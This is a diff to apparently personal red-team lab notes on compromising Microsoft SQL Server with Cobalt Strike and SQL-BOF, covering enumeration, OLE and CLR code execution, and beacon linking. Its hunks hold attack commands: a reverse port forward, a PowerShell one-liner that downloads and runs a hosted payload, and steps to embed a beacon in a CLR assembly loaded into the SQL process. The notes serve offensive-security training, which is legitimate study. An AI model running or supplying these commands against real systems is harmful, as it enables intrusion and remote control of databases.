@@ -1,11 +1,16 @@
 MS SQL (Structured Query Language) Server is Microsoft's proprietary relational database management system.
 
+## Interaction
+
 Popular tools to interact with MS SQL servers include [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL), [SQLRecon](https://github.com/skahwah/SQLRecon), [SQL-BOF](https://github.com/Tw1sm/SQL-BOF), [sqlcmd](https://github.com/microsoft/go-sqlcmd), [HeidiSQL](https://www.heidisql.com/), and [SSMS](https://learn.microsoft.com/en-us/ssms/download-sql-server-management-studio-ssms).
 
 This lesson uses [SQL-BOF](https://github.com/Tw1sm/SQL-BOF). 
-	Load Aggressor script first
-	Cobalt Strike > Script Manager
-	Load -> `C:\Tools\SQL-BOF\SQL\SQL.cna`
+```powershell
+Load Aggressor script first
+Cobalt Strike > Script Manager
+Load -> `C:\Tools\SQL-BOF\SQL\SQL.cna`
+```
+
 ## Enumeration
 Identify Servers
 ```powershell
@@ -39,6 +44,7 @@ sql-tables - list the tables in a given database.
 sql-columns - list the columns in a given table.
 sql-search - search for columns in the given database that contain a keyword.
 ```
+
 
 ## Code Execution
 There's not much we can do to abuse a SQL instance without sysadmin privileges.  Each of the techniques discussed in this lesson are disabled by default on new SQL server installations, but they can be enabled by a sysadmin.
@@ -87,6 +93,7 @@ beacon> sql-olecmd [DB hostname] "cmd /c calc"
 Cobalt Strike > Scripted Web Delivery > host payload
 
 # Set up reverse port forward
+beacon> rportfwd 8080 localhost 80
 
 # Create powershell one-liner to grab it through reverse port forward
 PS C:\Users\Attacker> $cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
@@ -136,20 +143,23 @@ Visual Studio > new Class Library (.NET framework)
 	Project Name : MyProcedure
 	Place in same directory : Checked
 Add smb_x64.xthread.bin as an embedded resourse # x64 & xthread!!!!
-Paste code
+Paste code (see code example below)
 Release > Build Solution
 
 # Load and execute the assembly 
 beacon> sql-clr [DB hostname] C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\MyProcedure.dll MyProcedure # Whatever you name it will change what you put here...
 
-# Establish link
-beacon> link [DB hostname] TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337 # PIPE depends on payload -- See Cobalt strike > listeners
+# Establish link (2 examples)
+beacon> link [DB hostname] TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337 
+	# PIPE depends on payload -- See Cobalt strike > listeners
+	# SMB payload requires we have CIFS... if we have MSSQL ticket, we might consider a TCP payload that we then connect to
+beacon> connect [db host] 4444
 
 # Cleanup
 beacon> sql-disableclr [DB hostname]
 ```
 ###### Examples of code
-Example used in lab - Injection so beacon runs inside MSSQL process
+Example used in lab - Injection so beacon runs inside MSSQL process (`modify the smb_x64 bits if using a different payload like tcp...)`
 ```c#
 using System;
 using System.IO;
